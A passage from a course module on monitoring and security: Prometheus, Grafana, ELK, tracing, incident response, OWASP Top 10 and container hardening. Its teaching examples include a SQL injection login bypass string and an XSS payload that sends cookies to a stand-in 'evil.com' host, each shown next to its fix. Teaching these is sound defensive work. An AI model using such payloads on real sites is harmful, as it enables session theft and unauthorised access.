# Week 8: Monitoring, Observability & Security

> **Goal**: Learn how to know when your systems are healthy (or not), how to find problems fast, and how to protect everything you have built.

---

# Part 1: Monitoring and Observability

## Why Monitoring?

### The Problem

Your Spring Boot application is deployed on 10 servers behind a load balancer. It is 3 AM. How do you know:

- Are all 10 servers healthy, or is one silently failing?
- Is response time increasing? (Users complain it's "slow" but everything looks "up")
- Is the disk filling up on server 7? (It will crash in 6 hours)
- Did the error rate spike at 2:47 AM? (A bad deploy went out)
- Which microservice is the bottleneck? (The order service? The payment service?)

**Without monitoring:**

You find out your app is down when a customer calls and shouts, "Your website is not working!" You check — yes, it's down. Since when? Nobody knows. What caused it? Nobody knows. How many customers were affected? Nobody knows. You spend 2 hours digging through server logs on 10 different machines trying to find the problem.

**With monitoring:**

At 2:48 AM, your phone buzzes: "ALERT: Error rate on order-service exceeded 5% for 3 minutes. Response time p99 jumped from 200ms to 4500ms." You check Grafana, see the spike started at 2:47 AM, correlate it with a deploy at 2:45 AM, roll back the deploy, and everything is fixed by 2:55 AM. The customer never noticed.

### Real-Life Analogy

**Car dashboard.** When you drive, you don't open the bonnet every 5 minutes to check the engine. Instead, you have a dashboard: speedometer, fuel gauge, temperature gauge, engine warning light, oil pressure light. These metrics tell you the health of the car at a glance.

- Speed = request rate
- Fuel = disk space / memory
- Temperature gauge = CPU usage
- Engine warning light = error alert
- Oil pressure = database connection pool

Without the dashboard, the first sign of trouble is when the engine catches fire. With it, you see the temperature rising and stop BEFORE the engine blows.

**Hospital analogy:** A patient in the ICU has monitors tracking heart rate, blood pressure, oxygen saturation, and temperature — continuously, automatically, 24/7. If any number goes outside the safe range, an alarm sounds IMMEDIATELY. Your production servers deserve the same treatment.

---

## The Three Pillars of Observability

Observability is the ability to understand what is happening INSIDE your system by looking at what comes OUT of it. It rests on three pillars:

### Pillar 1: Metrics — Numbers Over Time

Metrics are **numeric measurements collected at regular intervals**. They answer: "How much? How fast? How often?"

Examples:
- CPU usage: 73%
- Memory usage: 2.1 GB / 4 GB
- Request rate: 150 requests per second
- Error rate: 2.3% of requests return 5xx errors
- Response time: p50 = 45ms, p95 = 200ms, p99 = 850ms
- JVM heap: 412 MB used out of 512 MB max
- Active database connections: 18 out of 20

Real-life: Like checking your body's vital signs. Temperature: 98.6F (normal). Blood pressure: 120/80 (normal). Heart rate: 72 bpm (normal). If any number is abnormal, you investigate.

**What are p50, p95, p99?**

If your API has 100 requests in a minute:
- **p50 (median)**: 50 of the 100 requests were faster than this value. If p50 = 45ms, half your users get responses in under 45ms.
- **p95**: 95 of 100 requests were faster than this. If p95 = 200ms, most users are happy, but 5% waited longer.
- **p99**: 99 of 100 requests were faster. If p99 = 850ms, almost everyone is happy, but 1 in 100 users waited almost a second.

Why not just use average? Because averages hide problems. If 99 requests take 10ms and 1 request takes 10 seconds, the average is 109ms — looks fine! But that one user waited 10 seconds and is furious. p99 would show 10,000ms — clearly a problem.

### Pillar 2: Logs — Detailed Event Records

Logs are **timestamped text records** of events. They answer: "What exactly happened?"

```
2024-01-15 14:32:45.123 INFO  OrderService - Order #12345 created for user U789
2024-01-15 14:32:45.456 INFO  PaymentService - Processing payment for order #12345
2024-01-15 14:32:46.789 ERROR PaymentService - Payment failed for order #12345: Card declined
2024-01-15 14:32:46.790 INFO  OrderService - Order #12345 status changed to PAYMENT_FAILED
```

Real-life: Like a detailed medical report. Your temperature is 103F (metric), but WHY? The medical report (log) says: "Patient has a bacterial infection in the left lung, identified by blood test on Jan 15."

**Structured logs (JSON format) are far better than plain text:**

```json
{
  "timestamp": "2024-01-15T14:32:46.789Z",
  "level": "ERROR",
  "service": "payment-service",
  "traceId": "abc-123-def",
  "userId": "U789",
  "orderId": "12345",
  "message": "Payment failed",
  "reason": "Card declined",
  "cardLast4": "4242",
  "amount": 1500.00,
  "currency": "INR"
}
```

Why structured? Because you can SEARCH them. "Show me all ERROR logs from payment-service where amount > 10000 in the last 24 hours." Try doing that with plain text logs scattered across 10 servers.

### Pillar 3: Traces — Following a Request Through Services

Traces are **the journey of a single request** through your entire system. They answer: "Where did the time go?"

Example: A user clicks "Place Order" on your website. The request travels:

```
Browser → API Gateway (2ms)
           → Auth Service (5ms) — verify the user's token
           → Order Service (15ms) — create the order record
              → Inventory Service (8ms) — check stock
              → Pricing Service (3ms) — calculate total
           → Payment Service (500ms!) — charge the card
           → Notification Service (12ms) — send confirmation email
Total: 545ms
```

Looking at the trace, you immediately see: Payment Service took 500ms out of 545ms total. That is the bottleneck! Maybe the payment gateway is slow, or there is a slow database query in the payment service.

Without tracing, you would just know "the order flow is slow" but not WHERE. With 8 microservices involved, you would spend hours checking each one.

Real-life: Like tracking a Flipkart package. You can see: "Picked up from seller in Delhi (Day 1) → Reached Delhi warehouse (Day 1) → In transit to Mumbai (Day 2) → Stuck in Pune sorting center for 3 days! → Delivered (Day 5)." The trace shows you exactly where the delay happened.

---

## Prometheus — Metrics Collection

### What is Prometheus?

Prometheus is an open-source monitoring system that collects and stores metrics from your applications and infrastructure. It is the industry standard for metrics in the cloud-native world.

### How Prometheus Works — The Pull Model

Most monitoring systems work on a "push" model: your application sends metrics to the monitoring server. Prometheus is different — it uses a "pull" model:

1. Your Spring Boot app exposes metrics at a URL (e.g., `http://your-app:8080/actuator/prometheus`)
2. Prometheus "scrapes" (fetches) that URL every 15 seconds (configurable)
3. Prometheus stores the metrics in its time-series database
4. You query the metrics using PromQL (Prometheus Query Language)

Real-life: Push model = the doctor calls you every day and asks "How are you feeling?" Pull model = you go to the hospital for a check-up every 15 days, and the doctor reads your vitals. Prometheus is the hospital — it comes to check YOUR vitals on its schedule.

### Setting Up Prometheus with Spring Boot

**Step 1: Add dependencies to your Spring Boot app**

```xml
<!-- pom.xml -->
<dependencies>
    <!-- Spring Boot Actuator — exposes health, metrics, info endpoints -->
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-actuator</artifactId>
    </dependency>

    <!-- Micrometer Prometheus Registry — formats metrics for Prometheus -->
    <dependency>
        <groupId>io.micrometer</groupId>
        <artifactId>micrometer-registry-prometheus</artifactId>
    </dependency>
</dependencies>
```

**Step 2: Configure application.yml**

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, info, prometheus, metrics
        # Expose these Actuator endpoints via HTTP
  endpoint:
    health:
      show-details: always
      # Show detailed health info (database, disk, etc.)
  metrics:
    tags:
      application: my-spring-boot-app
      # Add a tag to all metrics so you can filter by application name
```

**Step 3: Access the metrics endpoint**

Start your Spring Boot app and visit: `http://localhost:8080/actuator/prometheus`

You will see something like:
```
# HELP jvm_memory_used_bytes The amount of used memory
# TYPE jvm_memory_used_bytes gauge
jvm_memory_used_bytes{area="heap",id="G1 Eden Space"} 2.5165824E7
jvm_memory_used_bytes{area="heap",id="G1 Survivor Space"} 1048576.0
jvm_memory_used_bytes{area="heap",id="G1 Old Gen"} 1.2582912E7

# HELP http_server_requests_seconds Duration of HTTP server request handling
# TYPE http_server_requests_seconds summary
http_server_requests_seconds_count{method="GET",status="200",uri="/api/orders"} 1523
http_server_requests_seconds_sum{method="GET",status="200",uri="/api/orders"} 45.234
```

This is the raw data Prometheus scrapes. Don't worry — you will never read this directly. Grafana makes it beautiful.

**Step 4: Configure Prometheus to scrape your app**

```yaml
# prometheus.yml
global:
  scrape_interval: 15s       # Scrape metrics every 15 seconds
  evaluation_interval: 15s   # Evaluate alerting rules every 15 seconds

scrape_configs:
  # Prometheus monitors itself
  - job_name: "prometheus"
    static_configs:
      - targets: ["localhost:9090"]

  # Your Spring Boot application
  - job_name: "spring-boot-app"
    metrics_path: "/actuator/prometheus"   # Where to find metrics
    scrape_interval: 10s                    # Scrape every 10 seconds (override global)
    static_configs:
      - targets: ["your-app-host:8080"]    # Your app's address
        labels:
          environment: "production"
          team: "backend"
```

**Step 5: Run Prometheus with Docker**

```yaml
# docker-compose.yml
version: "3.8"

services:
  prometheus:
    image: prom/prometheus:latest
    ports:
      - "9090:9090"
    volumes:
      - ./prometheus.yml:/etc/prometheus/prometheus.yml
      - prometheus-data:/prometheus
    command:
      - "--config.file=/etc/prometheus/prometheus.yml"
      - "--storage.tsdb.retention.time=30d"
      # Keep 30 days of metrics data

volumes:
  prometheus-data:
```

```bash
docker compose up -d
# Access Prometheus UI at http://localhost:9090
```

### Key Metrics to Monitor

#### Infrastructure Metrics (Server Health)

| Metric | What it tells you | Alert threshold |
|--------|-------------------|----------------|
| CPU usage | How busy the server is | > 80% for 5 min |
| Memory usage | How much RAM is used | > 85% |
| Disk usage | How full the disk is | > 80% |
| Disk I/O | How fast data is read/written | High wait times |
| Network traffic | Data in/out | Unusual spikes |

#### Application Metrics (App Health)

| Metric | What it tells you | Alert threshold |
|--------|-------------------|----------------|
| Request rate (RPS) | How much traffic you are handling | Sudden drop or spike |
| Error rate (5xx) | How many requests are failing | > 1% |
| Response time (p95) | How fast your app responds | > 500ms |
| Active connections | How many users are connected right now | Near max capacity |

#### JVM Metrics (Java-Specific)

| Metric | What it tells you | Alert threshold |
|--------|-------------------|----------------|
| Heap memory used | How much memory Java objects consume | > 80% of max heap |
| GC pause time | How long the app freezes during garbage collection | > 500ms |
| GC frequency | How often garbage collection runs | Increasing trend |
| Thread count | How many threads are active | Near max thread pool |

### PromQL — Querying Metrics

PromQL is how you ask questions about your metrics. Think of it like SQL, but for time-series data.

**Basic queries:**

```promql
# Current CPU usage
process_cpu_usage

# Total HTTP requests in the last 5 minutes
increase(http_server_requests_seconds_count[5m])

# Request rate (requests per second) averaged over 5 minutes
rate(http_server_requests_seconds_count[5m])

# Error rate — percentage of 5xx responses
sum(rate(http_server_requests_seconds_count{status=~"5.."}[5m]))
/
sum(rate(http_server_requests_seconds_count[5m]))
* 100

# 95th percentile response time
histogram_quantile(0.95, rate(http_server_requests_seconds_bucket[5m]))

# Total heap memory used
jvm_memory_used_bytes{area="heap"}
```

**Key PromQL functions:**

| Function | What it does | Example |
|----------|-------------|---------|
| `rate()` | Per-second rate of increase | `rate(http_requests_total[5m])` = requests per second |
| `increase()` | Total increase over time | `increase(http_requests_total[1h])` = total requests in last hour |
| `sum()` | Add up values | `sum(rate(...))` = total across all instances |
| `avg()` | Average value | `avg(cpu_usage)` = average CPU across servers |
| `histogram_quantile()` | Percentile from histogram | `histogram_quantile(0.99, ...)` = p99 value |

### Alerting Rules

Prometheus can trigger alerts when metrics cross thresholds. Alerts go to AlertManager, which routes them to Slack, email, PagerDuty, etc.

```yaml
# alert-rules.yml
groups:
  - name: application-alerts
    rules:
      # Alert if error rate exceeds 5% for 5 minutes
      - alert: HighErrorRate
        expr: |
          sum(rate(http_server_requests_seconds_count{status=~"5.."}[5m]))
          /
          sum(rate(http_server_requests_seconds_count[5m]))
          * 100 > 5
        for: 5m        # Must be true for 5 minutes before alerting
        labels:
          severity: critical
        annotations:
          summary: "High error rate detected"
          description: "Error rate is {{ $value }}% (threshold: 5%)"

      # Alert if response time p95 exceeds 1 second
      - alert: HighLatency
        expr: histogram_quantile(0.95, rate(http_server_requests_seconds_bucket[5m])) > 1
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "High latency detected"
          description: "p95 latency is {{ $value }}s (threshold: 1s)"

      # Alert if disk is more than 85% full
      - alert: DiskSpaceLow
        expr: (node_filesystem_avail_bytes / node_filesystem_size_bytes) * 100 < 15
        for: 10m
        labels:
          severity: warning
        annotations:
          summary: "Disk space low"
          description: "Only {{ $value }}% disk space remaining"

      # Alert if JVM heap usage is critically high
      - alert: JVMHeapHigh
        expr: jvm_memory_used_bytes{area="heap"} / jvm_memory_max_bytes{area="heap"} * 100 > 85
        for: 5m
        labels:
          severity: warning
        annotations:
          summary: "JVM heap usage is high"
          description: "Heap usage is {{ $value }}%"
```

**AlertManager configuration — Route alerts to Slack:**

```yaml
# alertmanager.yml
global:
  slack_api_url: "https://hooks.slack.com/services/YOUR/SLACK/WEBHOOK"

route:
  group_by: ["alertname", "severity"]
  group_wait: 30s       # Wait 30 seconds to group related alerts
  group_interval: 5m    # Minimum time between notifications for same group
  repeat_interval: 4h   # Re-alert every 4 hours if still firing
  receiver: "slack-notifications"

  routes:
    # Critical alerts go to a special channel
    - match:
        severity: critical
      receiver: "slack-critical"

receivers:
  - name: "slack-notifications"
    slack_configs:
      - channel: "#alerts"
        title: "{{ .CommonAnnotations.summary }}"
        text: "{{ .CommonAnnotations.description }}"

  - name: "slack-critical"
    slack_configs:
      - channel: "#alerts-critical"
        title: "CRITICAL: {{ .CommonAnnotations.summary }}"
        text: "{{ .CommonAnnotations.description }}"
```

---

## Grafana — Visualization

### What is Grafana?

Grafana is a dashboard tool that takes the raw numbers from Prometheus and turns them into beautiful, understandable charts and graphs. If Prometheus is the thermometer (collects the data), Grafana is the colorful health dashboard on the hospital monitor (displays the data).

### Setting Up Grafana

```yaml
# Add to your docker-compose.yml
services:
  grafana:
    image: grafana/grafana:latest
    ports:
      - "3000:3000"
    environment:
      - GF_SECURITY_ADMIN_USER=admin
      - GF_SECURITY_ADMIN_PASSWORD=admin123
    volumes:
      - grafana-data:/var/lib/grafana
    depends_on:
      - prometheus

volumes:
  grafana-data:
```

Access Grafana at `http://localhost:3000`. Login with admin/admin123.

**Connect Grafana to Prometheus:**
1. Go to Configuration (gear icon) > Data Sources
2. Click "Add data source"
3. Select "Prometheus"
4. Set URL to `http://prometheus:9090` (Docker service name)
5. Click "Save & Test"

### Pre-built Dashboards

Grafana has a library of thousands of pre-built dashboards. Instead of building from scratch, import these:

| Dashboard | ID | What it shows |
|-----------|----|----|
| JVM Micrometer | 4701 | JVM memory, GC, threads for Spring Boot |
| Spring Boot Statistics | 12900 | HTTP requests, response times, errors |
| Node Exporter Full | 1860 | CPU, memory, disk, network for Linux servers |
| Docker Container | 893 | Docker container metrics |

**To import:** Dashboards > Import > Enter the ID number > Select your Prometheus data source > Import.

### Creating Custom Dashboards

A custom dashboard for your Spring Boot app should include these panels:

**Row 1: Overview**
- Request rate (requests/second) — `rate(http_server_requests_seconds_count[5m])`
- Error rate (%) — 5xx errors / total requests * 100
- p95 response time — `histogram_quantile(0.95, rate(http_server_requests_seconds_bucket[5m]))`
- Active instances — count of targets that are "up"

**Row 2: JVM Health**
- Heap memory used vs max
- GC pause duration
- Thread count (daemon vs non-daemon)
- Loaded classes

**Row 3: Infrastructure**
- CPU usage per instance
- Memory usage per instance
- Disk usage
- Network I/O

**Row 4: Business Metrics** (custom metrics you add to your code)
- Orders created per minute
- Payment success rate
- User registrations per hour

### Adding Custom Metrics in Spring Boot

```java
import io.micrometer.core.instrument.Counter;
import io.micrometer.core.instrument.MeterRegistry;
import io.micrometer.core.instrument.Timer;
import org.springframework.stereotype.Service;

@Service
public class OrderService {

    private final Counter ordersCreatedCounter;
    private final Counter ordersFailedCounter;
    private final Timer orderProcessingTimer;

    public OrderService(MeterRegistry registry) {
        // Counter — tracks how many times something happens
        this.ordersCreatedCounter = Counter.builder("orders.created")
            .description("Total orders created")
            .tag("team", "backend")
            .register(registry);

        this.ordersFailedCounter = Counter.builder("orders.failed")
            .description("Total orders that failed")
            .tag("team", "backend")
            .register(registry);

        // Timer — tracks how long something takes
        this.orderProcessingTimer = Timer.builder("orders.processing.time")
            .description("Time to process an order")
            .register(registry);
    }

    public Order createOrder(OrderRequest request) {
        return orderProcessingTimer.record(() -> {
            try {
                Order order = processOrder(request);
                ordersCreatedCounter.increment();  // Count successful orders
                return order;
            } catch (Exception e) {
                ordersFailedCounter.increment();   // Count failed orders
                throw e;
            }
        });
    }
}
```

Now in Grafana, you can create panels for:
- `rate(orders_created_total[5m])` — orders created per second
- `rate(orders_failed_total[5m])` — order failures per second
- `histogram_quantile(0.95, rate(orders_processing_time_seconds_bucket[5m]))` — p95 order processing time

---

## ELK Stack — Log Management

### What is ELK?

**E = Elasticsearch** — Stores and searches logs. Think of it as Google for your logs. You throw billions of log lines at it, and it lets you search them in milliseconds.

**L = Logstash** — Collects logs from many sources (files, network, message queues), transforms them (parse, filter, enrich), and sends them to Elasticsearch.

**K = Kibana** — Visualizes logs. A web UI where you can search, filter, and create dashboards for your logs.

Alternative: **EFK** (Elasticsearch, Fluentd, Kibana) — Fluentd replaces Logstash. It is lighter and more popular in Kubernetes environments.

### Setting Up Structured Logging in Spring Boot

First, configure your Spring Boot app to output logs in JSON format. Plain text logs are hard to search. JSON logs have fields that Elasticsearch can index and query.

```xml
<!-- pom.xml — Add logback JSON encoder -->
<dependency>
    <groupId>net.logstash.logback</groupId>
    <artifactId>logstash-logback-encoder</artifactId>
    <version>7.4</version>
</dependency>
```

```xml
<!-- src/main/resources/logback-spring.xml -->
<configuration>
    <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
        <encoder class="net.logstash.logback.encoder.LogstashEncoder">
            <!-- Add custom fields to every log line -->
            <customFields>{"service":"order-service","environment":"production"}</customFields>
        </encoder>
    </appender>

    <root level="INFO">
        <appender-ref ref="CONSOLE" />
    </root>
</configuration>
```

Now your logs look like this:
```json
{
  "@timestamp": "2024-01-15T14:32:46.789Z",
  "level": "ERROR",
  "logger_name": "com.myapp.service.PaymentService",
  "message": "Payment failed for order #12345",
  "service": "order-service",
  "environment": "production",
  "stack_trace": "java.lang.RuntimeException: Card declined\n\tat ..."
}
```

### Docker Compose for ELK Stack

```yaml
# docker-compose-elk.yml
version: "3.8"

services:
  elasticsearch:
    image: docker.elastic.co/elasticsearch/elasticsearch:8.11.0
    environment:
      - discovery.type=single-node
      - xpack.security.enabled=false      # Disable security for local dev
      - "ES_JAVA_OPTS=-Xms512m -Xmx512m"  # 512 MB heap for Elasticsearch
    ports:
      - "9200:9200"
    volumes:
      - elasticsearch-data:/usr/share/elasticsearch/data

  logstash:
    image: docker.elastic.co/logstash/logstash:8.11.0
    ports:
      - "5044:5044"    # Beats input
      - "5000:5000"    # TCP input for application logs
    volumes:
      - ./logstash.conf:/usr/share/logstash/pipeline/logstash.conf
    depends_on:
      - elasticsearch

  kibana:
    image: docker.elastic.co/kibana/kibana:8.11.0
    ports:
      - "5601:5601"
    environment:
      - ELASTICSEARCH_HOSTS=http://elasticsearch:9200
    depends_on:
      - elasticsearch

volumes:
  elasticsearch-data:
```

```ruby
# logstash.conf
input {
  tcp {
    port => 5000
    codec => json_lines    # Expect JSON logs, one per line
  }
}

filter {
  # Parse the timestamp
  date {
    match => ["@timestamp", "ISO8601"]
  }
}

output {
  elasticsearch {
    hosts => ["http://elasticsearch:9200"]
    index => "app-logs-%{+YYYY.MM.dd}"    # One index per day
  }
}
```

Access Kibana at `http://localhost:5601`. Create an index pattern for `app-logs-*` and you can search all your logs.

**Searching logs in Kibana:**
- `level: ERROR AND service: order-service` — all errors from the order service
- `message: "Payment failed" AND @timestamp > now-1h` — payment failures in the last hour
- `userId: U789` — everything related to user U789 (great for debugging a specific user's issue)

---

## Distributed Tracing — Jaeger / Zipkin

### The Problem Tracing Solves

Your e-commerce app has 8 microservices. A customer says "placing an order is slow." Which service is causing the slowness?

Without tracing, you check each service's logs separately, try to correlate timestamps, and guess. With 8 services and hundreds of requests per second, this is nearly impossible.

### How Tracing Works

1. When a request enters your system, a **trace ID** is generated (e.g., `trace-abc-123`)
2. This trace ID is passed to EVERY service the request touches
3. Each service records a **span** — its portion of the request (service name, start time, end time)
4. All spans are sent to a tracing backend (Jaeger or Zipkin)
5. The tracing UI shows the complete journey with timing:

```
Trace: trace-abc-123 (Total: 547ms)
├── api-gateway        [0ms ─── 547ms]
│   ├── auth-service   [2ms ── 7ms]     (5ms)
│   ├── order-service  [8ms ── 535ms]   (527ms) ← SLOW!
│   │   ├── inventory  [10ms ── 18ms]   (8ms)
│   │   ├── pricing    [19ms ── 22ms]   (3ms)
│   │   └── db-query   [23ms ── 530ms]  (507ms) ← ROOT CAUSE!
│   └── notification   [536ms ── 547ms] (11ms)
```

Now you see it clearly: the order service has a database query that takes 507ms. That is the bottleneck.

### OpenTelemetry — The Standard

OpenTelemetry (OTel) is the universal standard for instrumentation. It collects metrics, logs, AND traces from your application and sends them to any backend (Jaeger, Zipkin, Prometheus, etc.).

**Setting up OpenTelemetry with Spring Boot:**

```xml
<!-- pom.xml -->
<dependency>
    <groupId>io.opentelemetry.instrumentation</groupId>
    <artifactId>opentelemetry-spring-boot-starter</artifactId>
    <version>2.1.0</version>
</dependency>
```

```yaml
# application.yml
otel:
  service:
    name: order-service
  exporter:
    otlp:
      endpoint: http://jaeger:4317    # Send traces to Jaeger
```

With this setup, Spring Boot automatically traces every incoming HTTP request, every outgoing HTTP call, and every database query — without you writing any tracing code.

---

## Health Checks and Status Pages

### Spring Boot Actuator

Spring Boot Actuator provides production-ready features out of the box:

```yaml
# application.yml
management:
  endpoints:
    web:
      exposure:
        include: health, info, metrics, prometheus
  endpoint:
    health:
      show-details: always
```

**Key Actuator endpoints:**

| Endpoint | What it shows |
|----------|-------------|
| `/actuator/health` | Is the app healthy? Checks database, disk, mail server |
| `/actuator/info` | App version, Git commit, build time |
| `/actuator/metrics` | All available metrics (use `/metrics/{name}` for specific) |
| `/actuator/prometheus` | Metrics in Prometheus format |

**Custom health indicator:**

```java
import org.springframework.boot.actuate.health.Health;
import org.springframework.boot.actuate.health.HealthIndicator;
import org.springframework.stereotype.Component;

@Component
public class PaymentGatewayHealthIndicator implements HealthIndicator {

    private final PaymentGatewayClient paymentGateway;

    public PaymentGatewayHealthIndicator(PaymentGatewayClient paymentGateway) {
        this.paymentGateway = paymentGateway;
    }

    @Override
    public Health health() {
        try {
            // Check if the payment gateway is reachable
            boolean isUp = paymentGateway.ping();
            if (isUp) {
                return Health.up()
                    .withDetail("gateway", "Razorpay")
                    .withDetail("status", "reachable")
                    .build();
            } else {
                return Health.down()
                    .withDetail("gateway", "Razorpay")
                    .withDetail("status", "unreachable")
                    .build();
            }
        } catch (Exception e) {
            return Health.down()
                .withDetail("gateway", "Razorpay")
                .withDetail("error", e.getMessage())
                .build();
        }
    }
}
```

Now `/actuator/health` includes:
```json
{
  "status": "UP",
  "components": {
    "db": { "status": "UP", "details": { "database": "PostgreSQL" } },
    "diskSpace": { "status": "UP", "details": { "free": "15 GB" } },
    "paymentGateway": { "status": "UP", "details": { "gateway": "Razorpay" } }
  }
}
```

---

## Incident Management

### SLI, SLO, SLA — The Reliability Framework

These three terms define how you measure and commit to reliability:

**SLI (Service Level Indicator)** — The metric you measure.
- "99.5% of requests complete within 500ms"
- "99.9% of requests return a non-error response"

Real-life: Like measuring your car's mileage — "My car gives 15 km/litre."

**SLO (Service Level Objective)** — The target you aim for.
- "We aim for 99.9% availability" (that is about 8.7 hours of downtime per year)
- "We aim for p99 latency under 1 second"

Real-life: Like your goal — "I want my car to give at least 12 km/litre."

**SLA (Service Level Agreement)** — The contract with your customers.
- "If availability drops below 99.5%, we will refund 10% of the monthly bill"
- SLAs always have consequences (refunds, credits, penalties)

Real-life: Like a guarantee — "If the car gives less than 10 km/litre, the dealer will refund Rs 50,000."

**Important relationship:** SLA < SLO < What you actually achieve.
- You ACHIEVE 99.95% uptime
- Your SLO TARGET is 99.9%
- Your SLA PROMISE is 99.5%

The buffer between SLO and SLA gives you room for unexpected issues without breaching the contract.

### On-Call and Incident Response

Real-life: Like a hospital's emergency protocol.

1. **Alert fires** — The monitoring system detects a problem (like an ambulance alarm)
2. **On-call engineer receives page** — The person "on duty" this week gets a notification on their phone
3. **Triage** — Is this critical (site down) or minor (one endpoint slow)?
4. **Mitigate** — Fix the immediate problem (roll back the deploy, restart the service, scale up)
5. **Communicate** — Update the status page, notify stakeholders
6. **Root cause analysis** — After the fire is out, figure out WHY it happened
7. **Postmortem** — Write a document: what happened, timeline, what we will do to prevent it, action items

**Postmortem culture:** Postmortems are **blameless**. The goal is to improve the SYSTEM, not to blame a PERSON. "The deploy pipeline allowed a broken build to reach production" — NOT "Rajesh deployed buggy code."

---

# Part 2: Security

## DevSecOps — Security in Every Step

### The Old Way (Waterfall Security)

```
Developers build the app (2 months)
   → QA tests it (2 weeks)
      → Security team audits it (1 week)
         → "47 vulnerabilities found!"
            → Back to developers (2 more weeks)
               → Re-test → Re-audit → Deploy (finally, 3 months later)
```

Problems:
- Security is an afterthought
- Finding vulnerabilities late is EXPENSIVE to fix
- Developers resent the security team ("they always block our releases")
- Security team is overwhelmed (reviews everything at the end)

### The New Way (DevSecOps)

Security checks happen at EVERY stage, automatically:

```
Code → [SAST scan] → Build → [Dependency scan] → Test → [DAST scan] → Deploy → [Runtime protection]
```

- **While coding**: IDE plugins warn about insecure patterns
- **At commit**: Pre-commit hooks check for secrets in code
- **At build**: SAST scans the code for vulnerabilities
- **At test**: DAST scans the running application
- **At deploy**: Container images are scanned for known vulnerabilities
- **In production**: Runtime monitoring detects anomalies

Real-life: Old way = checking if a building is safe AFTER it is built (expensive to fix). New way = checking safety at every step — foundation, walls, roof, wiring — so problems are caught early when they are cheap to fix.

---

## Application Security — OWASP Top 10

The OWASP Top 10 is the list of the most critical web application security risks. Every developer must know these.

### 1. Injection (SQL Injection, NoSQL Injection)

**What is it?** An attacker puts malicious code in an input field, and your application executes it as a command.

**Example (SQL Injection):**

Your login query:
```java
// DANGEROUS — DO NOT DO THIS
String query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'";
```

Attacker enters username: `admin' OR '1'='1' --`

The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = ''
```

`'1'='1'` is always true, so the attacker logs in as admin without knowing the password. The `--` makes the rest of the query a comment.

Real-life: Like someone writing "Give me all the money" on a bank withdrawal slip where you are supposed to write the amount. The bank teller (your app) blindly executes whatever is written.

**How to prevent:**

```java
// SAFE — Use parameterized queries (PreparedStatement)
String query = "SELECT * FROM users WHERE username = ? AND password = ?";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, username);   // Treated as DATA, not code
stmt.setString(2, password);
```

With Spring Data JPA, you are safe by default — JPA uses parameterized queries internally. But be careful with native queries:

```java
// SAFE — Spring Data JPA
@Query("SELECT u FROM User u WHERE u.username = :username")
User findByUsername(@Param("username") String username);

// DANGEROUS — Native query with string concatenation
@Query(value = "SELECT * FROM users WHERE username = '" + username + "'", nativeQuery = true)
// NEVER DO THIS
```

### 2. Broken Authentication

**What is it?** Weaknesses in how users log in and stay logged in.

Common problems:
- Allowing weak passwords ("123456", "password")
- Not implementing MFA (multi-factor authentication)
- Session tokens that never expire
- Session IDs in the URL (can be shared accidentally)
- Not locking accounts after failed login attempts

**How to prevent:**
- Enforce strong passwords (minimum 8 characters, mix of letters, numbers, special characters)
- Implement MFA (OTP via SMS or authenticator app)
- Set session timeouts (e.g., 30 minutes of inactivity)
- Lock accounts after 5 failed login attempts
- Use HTTPS for all authentication endpoints
- Use Spring Security — it handles most of this out of the box

### 3. Sensitive Data Exposure

**What is it?** Exposing sensitive data that should be protected.

Examples:
- Storing passwords in plain text (instead of hashing with bcrypt)
- Sending credit card numbers in API responses
- API keys committed to Git repositories
- Error messages that reveal database structure ("Column 'password_hash' not found")
- HTTP instead of HTTPS

**How to prevent:**
- Hash passwords with bcrypt (NEVER store plain text!)
- Encrypt sensitive data at rest (database encryption)
- Use HTTPS everywhere (encrypt data in transit)
- Never log sensitive data (passwords, credit card numbers, API keys)
- Return minimal error messages to users ("Login failed" not "User not found" vs "Wrong password")

```java
// Spring Security — Password hashing
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder();
    // BCrypt automatically salts and hashes passwords
    // "password123" → "$2a$10$xJ3..." (different every time due to salt)
}
```

### 4. Cross-Site Scripting (XSS)

**What is it?** An attacker injects malicious JavaScript into your website, which then runs in other users' browsers.

**Example:**

A user enters this as their "name" in a form:
```
<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

If your website displays the name without escaping it, every visitor's browser will execute that script, sending their cookies to the attacker.

Real-life: Like someone putting a fake "Cash deposit here" slot on an ATM. Unsuspecting users insert their cards and PINs into the fake slot, which sends the information to the thief.

**How to prevent:**
- Always escape/sanitize user input before displaying it
- Use Content Security Policy (CSP) headers
- React escapes by default (JSX auto-escapes) — but `dangerouslySetInnerHTML` bypasses this
- Spring Boot with Thymeleaf auto-escapes by default — use `th:text` (safe) not `th:utext` (unsafe)

### 5. Broken Access Control

**What is it?** A regular user accessing resources they should not have access to.

**Example:**
- User A's profile is at `/api/users/123`. User B changes the URL to `/api/users/123` and sees User A's data.
- A regular user accesses `/admin/dashboard` because there is no server-side check.
- API endpoint checks if the user is logged in, but not if they have the right ROLE.

**How to prevent:**
```java
// Spring Security — method-level authorization
@PreAuthorize("hasRole('ADMIN')")
@GetMapping("/admin/users")
public List<User> getAllUsers() { ... }

// Check that the user owns the resource they are accessing
@GetMapping("/api/orders/{orderId}")
public Order getOrder(@PathVariable String orderId, Authentication auth) {
    Order order = orderService.findById(orderId);
    if (!order.getUserId().equals(auth.getName())) {
        throw new AccessDeniedException("You can only view your own orders");
    }
    return order;
}
```

---

## Container Security

### Rule 1: Don't Run as Root

By default, Docker containers run as root. If an attacker breaks into your container, they have root access to everything inside.

```dockerfile
# BAD — runs as root
FROM openjdk:17
COPY app.jar /app.jar
CMD ["java", "-jar", "/app.jar"]

# GOOD — runs as a non-root user
FROM openjdk:17
RUN groupadd -r appuser && useradd -r -g appuser appuser
COPY --chown=appuser:appuser app.jar /app.jar
USER appuser
CMD ["java", "-jar", "/app.jar"]
```

### Rule 2: Use Minimal Base Images

```dockerfile
# BAD — Full Ubuntu image (200+ MB, lots of unnecessary tools)
FROM ubuntu:22.04
RUN apt install openjdk-17-jdk
# Includes: bash, curl, wget, gcc, python... an attacker's toolkit

# BETTER — Slim JDK image (smaller, fewer tools)
FROM eclipse-temurin:17-jre-alpine
